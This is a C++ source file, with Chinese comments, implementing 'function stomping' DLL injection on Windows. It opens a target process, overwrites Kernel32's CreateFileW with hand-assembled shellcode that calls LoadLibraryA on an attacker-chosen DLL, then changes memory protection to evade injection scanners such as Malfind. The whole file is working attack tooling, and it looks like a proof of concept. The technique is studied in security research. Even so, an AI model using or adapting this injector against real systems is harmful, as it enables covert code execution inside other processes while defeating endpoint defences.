// FunctionStomping.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <Shlwapi.h>
using namespace std;

#pragma comment(lib, "Shlwapi.lib")

BYTE* GetFunctionBase(HANDLE TargetProcessHandle, const wchar_t* moduleName, const char* functionName);
BOOL InjectDll(ULONG32 ulTargetProcessID, CHAR* DllFullPath) {
#ifdef _WIN64
    BYTE code[] = {
    0x48, 0x83, 0xEC, 0x28,             //sub         rsp,28h
    0x48, 0x89, 0x44, 0x24, 0x18,       //mov         qword ptr [rsp+18h],rax           
    0x48, 0x89, 0x4C, 0x24, 0x10,       //mov         qword ptr [rsp+10h],rcx 
    0x48, 0xB9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,  //mov         rcx,1111111111111111h 
    0x48, 0xB8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,  //mov         rax,2222222222222222h
    0xFF, 0xD0,                         //call        rax
    0x48, 0x8B, 0x4C, 0x24, 0x10,       //mov         rcx,qword ptr [rsp+10h]
    0x48, 0x8B, 0x44, 0x24, 0x18,       //mov         rax,qword ptr [rsp+18h]
    0x48, 0x83, 0xC4, 0x28,             //add         rsp,28h
    0x48, 0x83, 0xEC, 0x08,             //sub         rsp,8
    0xC7, 0x04, 0x24, 0xff, 0xff, 0xff, 0xff,  //mov         dword ptr [rsp],ffffffffh
    0xC7, 0x44, 0x24, 0x04, 0xff, 0xff, 0xff, 0xff, //mov dword ptr [rsp + 4], ffffffffh
    0x58,                               //pop rax
    0xC3                                //ret
    };
#else
    BYTE code[] = {
    0x60,                          //pushad
    0x68, 0x11, 0x11, 0x11, 0x11,  //push 11111111h
    0xb8, 0x22, 0x22, 0x22, 0x22,  //mov eax, 22222222h
    0xff, 0xd0,                    //call eax
    0x61,                          //popad
    0x0d, 0xff, 0xff, 0xff, 0xff,  //or eax, ffffffffh
    0xc3                           //ret
    };
#endif // _WIN64
    DWORD oldPermissions;

    //Gets the process handle for the target process
    HANDLE TargetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ulTargetProcessID);
    if (OpenProcess == NULL)
    {
        cout << "[-] Could not find process" << endl;
    }
    cout << "[+] Got process handle!" << endl;

    // Getting the remote module base.
    BYTE* functionBase = GetFunctionBase(TargetProcessHandle, L"Kernel32.dll", "CreateFileW");

    if (!functionBase) {
        DWORD lastError = GetLastError();

        if (lastError == 126) {
            cerr << "[-] The function name is misspelled or the function is unstompable." << endl;
        }
        else {
            cerr << "[-] Could not get function pointer: " << lastError << endl;
        }
        CloseHandle(TargetProcessHandle);
        return -1;
    }

    cout << "[+] Got function base!" << endl;
    
    // Verifying that the shellcode isn't too big.
    SIZE_T sizeToWrite = sizeof(code);
    BYTE* oldFunction;

    if (!ReadProcessMemory(TargetProcessHandle, functionBase, &oldFunction, sizeToWrite, NULL)) {
        cerr << "[-] Shellcode is too big!" << endl;
        CloseHandle(TargetProcessHandle);
        return -1;
    }

    //patch the shellcode
    //申请空间
    LPVOID RemoteDllPath = VirtualAllocEx(TargetProcessHandle, NULL, strlen(DllFullPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    //write
    if (!WriteProcessMemory(TargetProcessHandle, RemoteDllPath, DllFullPath, strlen(DllFullPath) + 1, NULL)) {
        VirtualFreeEx(TargetProcessHandle, RemoteDllPath, strlen(DllFullPath) + 1, MEM_DECOMMIT);
        return false;
    }
    BYTE* loadLibraryAddress = GetFunctionBase(TargetProcessHandle, L"Kernel32.dll", "LoadLibraryA");
#ifdef _WIN64
    * reinterpret_cast<PVOID*>(code + 0x10) = static_cast<void*>(RemoteDllPath);
    //修补LoadLibrary的地址
    *reinterpret_cast<PVOID*>(code + 0x1a) = static_cast<void*>(loadLibraryAddress);
    //修补返回地址，为当前停止的地址的低32位
    //*reinterpret_cast<unsigned int*>(code + 0x39) = ctx.Rip & 0xFFFFFFFF;
    ////修补返回地址，为当前停止的地址的高32位
    //*reinterpret_cast<unsigned int*>(code + 0x41) = ctx.Rip >> 32;
#else
    //根据地址，修补我们的代码
    //修补dll的地址，我们把dll地址复制到RemoteDllPath的位置
    * reinterpret_cast<PVOID*>(code + 2) = static_cast<void*>(RemoteDllPath);
    //修补LoadLibrary的地址
    *reinterpret_cast<PVOID*>(code + 7) = static_cast<void*>(loadLibraryAddress);

#endif // _WIN64

    // Changing the protection to READWRITE to write the shellcode.
    if (!VirtualProtectEx(TargetProcessHandle, functionBase, sizeToWrite, PAGE_EXECUTE_READWRITE, &oldPermissions)) {
        cerr << "[-] Failed to change protection: " << GetLastError() << endl;
        CloseHandle(TargetProcessHandle);
        return -1;
    }
    cout << "[+] Changed protection to RW to write the shellcode." << endl;

    SIZE_T written;

    // Writing the shellcode to the remote process.
    if (!WriteProcessMemory(TargetProcessHandle, functionBase, code, sizeof(code), &written)) {
        cerr << "[-] Failed to overwrite function: " << GetLastError() << endl;
        VirtualProtectEx(TargetProcessHandle, functionBase, sizeToWrite, oldPermissions, &oldPermissions);
        CloseHandle(TargetProcessHandle);
        return -1;
    }

    cout << "[+] Successfuly stomped the function!" << endl;

    // Changing the protection to WCX to evade injection scanners like Malfind: https://www.cyberark.com/resources/threat-research-blog/masking-malicious-memory-artifacts-part-iii-bypassing-defensive-scanners.
    if (!VirtualProtectEx(TargetProcessHandle, functionBase, sizeToWrite, PAGE_EXECUTE_WRITECOPY, &oldPermissions)) {
        cerr << "[-] Failed to change protection: " << GetLastError() << endl;
        CloseHandle(TargetProcessHandle);
        return -1;
    }

    cout << "[+] Changed protection to WCX to run the shellcode!\n[+] Shellcode successfuly injected!" << endl;

    CloseHandle(TargetProcessHandle);
    return TRUE;
}

// Based on: https://github.com/countercept/ModuleStomping/blob/master/injectionUtils/utils.cpp
BYTE* GetFunctionBase(HANDLE TargetProcessHandle, const wchar_t* moduleName, const char* functionName) {
    BOOL res;
    DWORD moduleListSize;
    BYTE* functionBase = NULL;

    //Getting the size to allocate
    res = EnumProcessModules(TargetProcessHandle, NULL, 0, &moduleListSize);

    if (!res) {
        cerr << "[-] Failed to get buffer size for EnumProcessModules: " << GetLastError() << endl;
        return functionBase;
    }

    // Getting the module list.
    HMODULE* moduleList = (HMODULE*)malloc(moduleListSize);

    if (moduleList == 0) {
        return functionBase;
    }
    memset(moduleList, 0, moduleListSize);

    res = EnumProcessModules(TargetProcessHandle, moduleList, moduleListSize, &moduleListSize);
    
    if (!res) {
        // Retry this one more time.
        res = EnumProcessModules(TargetProcessHandle, moduleList, moduleListSize, &moduleListSize);

        if (!res) {
            cerr << "[-] Failed to EnumProcessModules: " << GetLastError() << endl;
            free(moduleList);
            return functionBase;
        }
    }

    // Iterating the modules of the process.
    for (HMODULE* modulePtr = &moduleList[0]; modulePtr < &moduleList[moduleListSize / sizeof(HMODULE)]; modulePtr++) {
        HMODULE currentModule = *modulePtr;
        wchar_t currentModuleName[MAX_PATH];
        memset(currentModuleName, 0, MAX_PATH);

        // Getting the module name.
        if (GetModuleFileNameEx(TargetProcessHandle, currentModule, currentModuleName, MAX_PATH - sizeof(wchar_t)) == 0) {
            cerr << "[-] Failed to get module name: " << GetLastError() << endl;
            continue;
        }

        // Checking if it is the module we seek.
        if (StrStrI(currentModuleName, moduleName) != NULL) {

            functionBase = (BYTE*)GetProcAddress(currentModule, functionName);
            break;
        }
    }

    free(moduleList);
    return functionBase;
}

int main()
{
    ULONG32 ulProcessID = 0;
    cout << "Input the Process ID:" << endl;
    cin >> ulProcessID;
    CHAR DllFullPath[MAX_PATH] = { 0 };
#ifndef _WIN64
    strcpy_s(DllFullPath, "D:\\project\\TestDll\\Release\\TestDll.dll");
#else // _WIN64
    strcpy_s(DllFullPath, "D:\\project\\TestDll\\x64\\Release\\TestDll.dll");
#endif
    //注入
    if (!InjectDll(ulProcessID, DllFullPath)) {
        printf("Failed to inject DLL");
        return FALSE;
    }
    return 0;
}
